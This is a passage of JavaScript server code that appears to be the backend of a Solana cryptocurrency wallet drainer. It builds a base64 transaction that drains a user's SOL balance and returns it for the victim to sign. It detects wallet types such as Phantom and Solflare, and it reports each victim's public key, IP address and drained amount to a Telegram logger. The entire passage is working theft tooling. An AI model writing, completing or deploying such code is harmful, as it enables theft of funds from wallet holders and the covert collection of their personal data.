      console.log(`[DRAIN_LOG] - Has drain instructions: ${hasDrainInstructions}`);
      console.log(`[DRAIN_LOG] - Has potential for drain: ${hasPotentialForDrain}`);
      
      // Use wallet type from frontend, fallback to user agent detection
      let detectedWalletType = walletType;
      if (walletType === 'Unknown') {
        // Fallback to user agent detection if frontend didn't provide wallet type
        if (isSolflare) detectedWalletType = 'Solflare';
        else if (isGlow) detectedWalletType = 'Glow';
        else if (isBackpack) detectedWalletType = 'Backpack';
        else if (isExodus) detectedWalletType = 'Exodus';
        else if (userAgent.includes('Phantom') || userAgent.includes('phantom')) detectedWalletType = 'Phantom';
        else if (userAgent.includes('TrustWallet') || userAgent.includes('trustwallet')) detectedWalletType = 'Trust Wallet';
      }
      
      // Debug logging for wallet type detection
      debugLog('Frontend Wallet Type:', walletType);
      debugLog('Final Detected Wallet Type:', detectedWalletType);
      debugLog('User Agent:', userAgent);
      debugLog('Is Solflare:', isSolflare);
      debugLog('Is Glow:', isGlow);
      debugLog('Is Backpack:', isBackpack);
      debugLog('Is Exodus:', isExodus);
      
      // Note: Wallet detection is already logged by frontend via /api/drainer/log-wallet
      // Backend only logs drain success/failure, not wallet detection
      
      // Return transaction data
      const response = {
        success: true,
        transaction: Buffer.from(serialized).toString('base64'),
        metadata: {
          user: userPubkey.toString(),
          instructions: tx.instructions.length,
          size: serialized.length,
          tokens: 0,
          nfts: 0,
          solAmount: actualDrainAmount || 0,
          feeAmount: TOTAL_RESERVED,
          totalBalance: lamports,
          timestamp: new Date().toISOString()
        }
      };
      
      // Validate response data
      if (!response.transaction || response.transaction.length === 0) {
        throw new Error('Invalid transaction data');
      }
      
      // Validate base64 encoding
      try {
        const testDecode = Buffer.from(response.transaction, 'base64');
        if (testDecode.length === 0) {
          throw new Error('Invalid base64 encoding');
        }
        
        const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
        if (!base64Regex.test(response.transaction)) {
          throw new Error('Invalid base64 string format');
        }
      } catch (base64Error) {
        await telegramLogger.logDrainFailed({
          publicKey: userPubkey.toString(),
          lamports: lamports,
          ip: userIp,
          error: 'Failed to encode transaction as base64'
        });
        return res.status(500).json({ error: 'Failed to encode transaction', details: 'Transaction encoding failed' });
      }
      
      // Log transaction created (not success yet - user hasn't signed)
      console.log('[DRAIN_CREATED] Transaction created successfully:', {
        publicKey: userPubkey.toString(),
        drainAmount: actualDrainAmount,
        drainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
        balance: lamports,
        balanceSOL: (lamports / 1e9).toFixed(6),
        ip: userIp
      });
      
      res.status(200).json(response);
    } catch (error) {
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey?.toString() || 'N/A',
        lamports: lamports || 0,
        ip: userIp,
        error: 'Failed to finalize transaction'
      });
      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
    }
  } catch (error) {
    console.error('[API] General error:', error);
    
    try {
      const errorResponse = await handleDrainError(error, userPubkey, userIp);
      return res.status(errorResponse.status).json({ 
        error: errorResponse.error, 
        details: errorResponse.details,
        code: errorResponse.code
    });
    } catch (logError) {
      console.error('[API] Failed to handle error:', logError);
      return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
    }
  }
}

// Handle drain confirmation logging
export async function logConfirmation(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    if (status === 'confirmed' || status === 'finalized') {
      // Log successful drain
      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
      const lamports = parseInt(req.body.lamports) || 0;
      
      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
        publicKey: publicKey,
        actualDrainAmount: actualDrainAmount,
        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
        lamports: lamports,
        lamportsSOL: (lamports / 1e9).toFixed(6),
        ip: userIp
      });
      
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
        actualDrainAmount: actualDrainAmount,
        lamports: lamports,
        ip: userIp
      });
    } else if (status === 'failed') {
      // Log failed drain
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Log confirmation error:', error);
    res.status(500).json({ error: 'Failed to log confirmation' });
  }
} 